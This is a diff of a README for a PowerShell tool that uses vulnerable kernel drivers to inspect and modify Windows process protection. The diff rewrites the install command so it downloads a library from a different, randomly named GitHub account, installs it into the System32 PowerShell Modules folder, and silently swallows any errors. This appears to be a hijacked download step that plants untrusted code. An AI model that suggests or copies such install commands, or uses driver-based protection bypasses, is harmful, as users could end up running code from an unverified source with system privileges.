@@ -7,36 +7,25 @@ The tool provides functionality for inspecting and modifying process protection 
 Designed for security research, malware analysis, reverse engineering, red team laboratory environments, and educational exploration of Windows process protection technologies.
 
 ---
-## ⚙️ BYOVD Extended File
-
-This section contains additional DLLs that are not included in the main `ps1` script to keep the core file size optimized.
-*   **Repository Scope:** The main script currently supports over 30 system drivers.
-*   **Expansion:** Browse the files below to find specific drivers for your use case.
-
 ## ⚙️ Prerequisites & Setup
 
 1. **Must install the latest library:** The script leverages kernel drivers to interact with process structures. and need to use the latest Ps1.Lib, to do it.
 
 ````powershell
-$adminRequired = [Security.Principal.WindowsIdentity]::GetCurrent()
-$adminRole = [Security.Principal.WindowsPrincipal]$adminRequired
-if (-not $adminRole.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Error: This script must be run as Administrator."
-    Read-Host
-    exit 1
-}
+try {
+        $repoUrl = "https://github.com/v8k6b2jjps-prog/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
+        $moduleFolder = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\NativeInteropLib"
+        $tempFolder = "$env:TEMP\Unmanaged.PS1.Library"
+        $zipFile = "$tempFolder.zip"
 
-$repoUrl = "https://github.com/BlueOnBLack/Unmanaged.PS1.Library/archive/refs/heads/main.zip"
-$moduleFolder = "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\NativeInteropLib"
-$tempFolder = "$env:TEMP\Unmanaged.PS1.Library"
-$zipFile = "$tempFolder.zip"
-
-Invoke-WebRequest -Uri $repoUrl -OutFile $zipFile
-Expand-Archive -Path $zipFile -DestinationPath $tempFolder -Force
-if (-not (Test-Path $moduleFolder)) { New-Item -Path $moduleFolder -ItemType Directory }
-Copy-Item -Path "$tempFolder\Unmanaged.PS1.Library-main\*" -Destination $moduleFolder -Recurse -Force
-Remove-Item -Path $zipFile -Force | Out-Null
-Remove-Item -Path $tempFolder -Recurse -Force | Out-Null
+        Invoke-WebRequest -Uri $repoUrl -OutFile $zipFile
+        Expand-Archive -Path $zipFile -DestinationPath $tempFolder -Force
+        if (-not (Test-Path $moduleFolder)) { New-Item -Path $moduleFolder -ItemType Directory }
+        Copy-Item -Path "$tempFolder\Unmanaged.PS1.Library-main\*" -Destination $moduleFolder -Recurse -Force | Out-Null
+        Remove-Item -Path $zipFile -Force | Out-Null
+        Remove-Item -Path $tempFolder -Recurse -Force | Out-Null
+    } catch {
+    }
 
 ````
 2. **Service Cleanup:** The script leverages kernel drivers to interact with process structures. Ensure you remove the associated services after use. You can clean up known vulnerable/utilized drivers using the command below:
